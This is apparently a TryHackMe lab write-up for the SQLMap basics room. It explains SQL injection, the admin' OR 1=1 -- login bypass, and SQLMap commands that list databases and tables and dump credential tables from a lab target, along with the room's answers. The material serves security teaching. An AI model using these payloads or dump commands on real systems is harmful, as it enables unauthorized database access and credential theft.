# SQLMap: The Basics - TryHackMe

> Learn about SQL injection and exploit this vulnerability through the SQLMap tool

**Room Link:** https://tryhackme.com/room/sqlmapbasics

<img width="1770" height="863" alt="image" src="https://github.com/user-attachments/assets/7573739b-ddc9-4ea2-b599-0011ca9b2f13" />

---

## Task 1: Introduction

### What is SQL Injection?

SQL injection is one of the most prevalent vulnerabilities in web applications. It has been a critical security issue for many years.

### Understanding Databases

Before diving into SQL injection, we need to understand:
- What is a database?
- How websites interact with databases
- How data is stored and retrieved

### How Websites Use Databases

Websites use databases to:
- Store user information
- Save product data
- Manage content
- Handle transactions
- Store application settings

### SQL (Structured Query Language)

SQL is the language that builds the interaction between websites and databases.

**Example SQL Query:**
```sql
SELECT * FROM users WHERE username='admin';
```

### Questions

**Which language builds the interaction between a website and its database?**
- Answer: `sql`

---

## Task 2: SQL Injection Vulnerability

### How SQL Injection Works

Websites interact with databases through SQL queries. Attackers can manipulate these queries to access unauthorized data.

### Example Vulnerable Query

**Normal query:**
```sql
SELECT * FROM users WHERE username='john' AND password='password123';
```

**Injected query:**
```sql
SELECT * FROM users WHERE username='admin' OR 1=1 --' AND password='anything';
```

### Boolean Operators in SQL

**OR Operator**
- Checks if at least one condition is true
- If either side is true, whole condition is true

**Example:**
```sql
WHERE username='admin' OR 1=1
```

This always returns true because `1=1` is always true!

**AND Operator**
- Both conditions must be true
- If any side is false, whole condition is false

### Common SQL Injection Techniques

**Authentication Bypass:**
```
Username: admin' OR 1=1 --
Password: anything
```

**Comment Symbols:**
- `--` (SQL comment - ignores rest of query)
- `#` (MySQL comment)
- `/* */` (Multi-line comment)

### Questions

**Which boolean operator checks if at least one side of the operator is true for the condition to be true?**
- Answer: `or`

---

**Is 1=1 in an SQL query always true? (YEA/NAY)**

Yes! `1=1` is a mathematical truth, so it always evaluates to true.

- Answer: `YEA`

---

## Task 3: Automated SQL Injection Tool

### What is SQLMap?

SQLMap is an automated tool for:
- Detecting SQL injection vulnerabilities
- Exploiting SQL injection flaws
- Extracting database information
- Taking over database servers

### Why Use SQLMap?

**Manual Testing:**
- Time-consuming
- Requires extensive knowledge
- Prone to errors
- Tedious process

**Automated with SQLMap:**
- Fast and efficient
- Handles complex payloads
- Tests multiple techniques
- Extracts data automatically

### Basic SQLMap Commands

**Test for vulnerability:**
```bash
sqlmap -u "http://target.com/page?id=1"
```

**List all databases:**
```bash
sqlmap -u "http://target.com/page?id=1" --dbs
```

**List tables in database:**
```bash
sqlmap -u "http://target.com/page?id=1" -D database_name --tables
```

**Dump table contents:**
```bash
sqlmap -u "http://target.com/page?id=1" -D database_name -T table_name --dump
```

### Common SQLMap Flags

| Flag | Purpose |
|------|---------|
| `-u` | Target URL |
| `--dbs` | List all databases |
| `-D` | Specify database |
| `--tables` | List tables |
| `-T` | Specify table |
| `--columns` | List columns |
| `--dump` | Dump data |
| `--level` | Test level (1-5) |
| `--risk` | Risk level (1-3) |
| `--batch` | Non-interactive mode |

### Questions

**Which flag in the SQLMap tool is used to extract all the databases available?**
- Answer: `--dbs`

---

**What would be the full command of SQLMap for extracting all tables from the "members" database? (Vulnerable URL: http://sqlmaptesting.thm/search/cat=1)**

We need to:
1. Specify URL with `-u`
2. Specify database with `-D members`
3. List tables with `--tables`

```bash
sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D members --tables
```

- Answer: `sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D members --tables`

---

## Task 4: Practical Exercise

### Starting the Challenge

Click **Start Machine** and wait for the machine to boot up.

The vulnerable application will be available at the provided IP address.

### Challenge Walkthrough

**Target URL:**
```
http://10.10.79.8/ai/includes/user_login?email=test&password=test
```

**Note:** Replace `10.10.79.8` with your actual machine IP!

---

### Question 1: How many databases are available?

**Command:**
```bash
sqlmap -u 'http://10.10.79.8/ai/includes/user_login?email=test&password=test' --dbs --level=5
```

**Flag breakdown:**
- `-u` - Target URL
- `--dbs` - List all databases
- `--level=5` - Maximum test level (more thorough)

**Output will show:**
```
[*] information_schema
[*] ai
[*] mysql
[*] performance_schema
[*] sys
[*] test
```

Count them up!

- Answer: `6`

---

### Question 2: What is the name of the table in the "ai" database?

**Command:**
```bash
sqlmap -u 'http://10.10.79.8/ai/includes/user_login?email=test&password=test' -D ai --tables --level=5
```

**Flag breakdown:**
- `-D ai` - Specify the "ai" database
- `--tables` - List all tables
- `--level=5` - Maximum test level

**Output will show:**
```
Database: ai
[1 table]
+--------+
| user   |
+--------+
```

- Answer: `user`

---

### Question 3: What is the password of test@chatai.com?

**Command:**
```bash
sqlmap -u 'http://10.10.79.8/ai/includes/user_login?email=test&password=test' -D ai -T user --dump --level=5
```

**Flag breakdown:**
- `-D ai` - Database name
- `-T user` - Table name
- `--dump` - Extract all data
- `--level=5` - Maximum test level

**Output will show:**
```
Database: ai
Table: user
[1 entry]
+----+------------------+----------+
| id | email            | password |
+----+------------------+----------+
| 1  | test@chatai.com  | 12345678 |
+----+------------------+----------+
```

- Answer: `12345678`

---

### Important Flags

| Flag | Purpose | Example |
|------|---------|---------|
| `-u` | Target URL | `-u "http://target.com/page?id=1"` |
| `--dbs` | List databases | `--dbs` |
| `-D` | Database name | `-D members` |
| `--tables` | List tables | `--tables` |
| `-T` | Table name | `-T users` |
| `--columns` | List columns | `--columns` |
| `-C` | Column names | `-C username,password` |
| `--dump` | Extract data | `--dump` |
| `--level` | Test thoroughness (1-5) | `--level=5` |
| `--risk` | Risk level (1-3) | `--risk=3` |
| `--batch` | Auto-answer prompts | `--batch` |
| `--threads` | Number of threads | `--threads=10` |

### Testing Levels

| Level | Description |
|-------|-------------|
| 1 | Basic tests (default) |
| 2 | More extensive tests |
| 3 | Additional payloads |
| 4 | Even more tests |
| 5 | Maximum testing (thorough) |

### Risk Levels

| Risk | Description |
|------|-------------|
| 1 | Safe (default) |
| 2 | Medium risk |
| 3 | All tests (may be destructive) |

---

## SQL Injection Basics

### SQL Boolean Operators

| Operator | Meaning | Example |
|----------|---------|---------|
| `AND` | Both true | `username='admin' AND password='pass'` |
| `OR` | At least one true | `username='admin' OR 1=1` |
| `NOT` | Opposite | `NOT username='admin'` |

### SQL Comments

| Database | Comment Syntax |
|----------|----------------|
| MySQL | `-- ` or `#` |
| SQL Server | `-- ` or `/* */` |
| Oracle | `-- ` |
| PostgreSQL | `-- ` or `/* */` |

**Note:** MySQL requires a space after `--`

---

## Key Takeaways

- **SQL injection** is a critical vulnerability
- **SQL** builds website-database interaction
- **OR operator** makes conditions true easily
- **1=1** is always true in SQL
- **SQLMap** automates SQL injection testing
- **--dbs** lists all databases
- **-D** specifies database name
- **--tables** lists tables in database
- **-T** specifies table name
- **--dump** extracts all data
- **--level=5** for thorough testing
- **Always get authorization** before testing
- **Document findings** for reporting
- **SQL injection** can lead to complete database compromise

SQLMap is a powerful tool that makes SQL injection testing much easier. Understanding both manual and automated techniques is crucial for web application security
